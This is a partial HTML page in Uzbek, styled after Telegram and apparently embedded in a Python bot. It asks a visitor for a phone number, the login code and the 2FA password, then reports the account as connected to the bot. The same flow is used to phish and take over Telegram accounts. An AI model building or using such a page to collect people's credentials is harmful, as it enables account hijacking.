...
<title>Shaxsiy Telegram - Kirish</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
    background: linear-gradient(135deg, #54a9eb 0%, #2b5278 100%);
  ...
  h1 { font-size: 20px; margin: 0 0 4px; color: #1f2733; }
  p.sub { font-size: 13px; color: #707579; margin: 10px 0 22px; line-height: 1.4; }
  input {
    width: 100%; padding: 13px 14px; border: 1px solid #dfe3e6; border-radius: 10px;
    font-size: 16px; outline: none; margin-bottom: 12px; box-sizing: border-box;
  }
  input:focus { border-color: #2aabee; }
  button {
    width: 100%; background: linear-gradient(135deg, #2aabee, #229ed9); color: #fff;
    border: none; border-radius: 10px; padding: 13px; font-size: 15px; font-weight: 600;
    cursor: pointer;
  }
  button:disabled { opacity: .6; cursor: not-allowed; }
  .error { color: #e53935; font-size: 13px; margin: -4px 0 12px; text-align: left; display: none; }
  .success { color: #1b8a3a; font-size: 14px; margin-top: 10px; }
  .hidden { display: none; }
</style>
</head>
<body>
  <div class="card">
    <div class="logo">🔐</div>
    <h1>Shaxsiy Telegram — Kirish</h1>
    <p class="sub">Bu sahifa faqat SIZ uchun yaratilgan (bot orqali). Havolani hech kimga yubormang.</p>

    <div id="step-phone">
      <input id="phone" type="tel" placeholder="+998901234567" autocomplete="off" />
      <div class="error" id="err-phone"></div>
      <button onclick="sendCode()">Davom etish</button>
    </div>

    <div id="step-code" class="hidden">
      <input id="code" type="text" inputmode="numeric" placeholder="Kelgan kod" autocomplete="off" />
      <div class="error" id="err-code"></div>
      <button onclick="verifyCode()">Tasdiqlash</button>
    </div>

    <div id="step-password" class="hidden">
      <input id="password" type="password" placeholder="2FA parol" autocomplete="off" />
      <div class="error" id="err-password"></div>
      <button onclick="verifyPassword()">Kirish</button>
    </div>

    <div id="step-done" class="hidden">
      <div class="success" id="done-text"></div>
    </div>
  </div>
...
<script>
  ...
  function showStep(id) {
    ["step-phone", "step-code", "step-password", "step-done"].forEach(s => {
  ...
  if (!token) {
    document.querySelector(".card").innerHTML =
      "<div class='logo'>⚠️</div><h1>Havola noto'g'ri</h1><p class='sub'>Token topilmadi. Botdan qaytadan havola oling.</p>";
  }
  ...
  function finish(r) {
    ...
    document.getElementById("done-text").textContent =
      `✅ Muvaffaqiyatli ulandi: ${r.name} (${r.phone}). Botga qayting.`;
  }
</script>
</body>
</html>"""
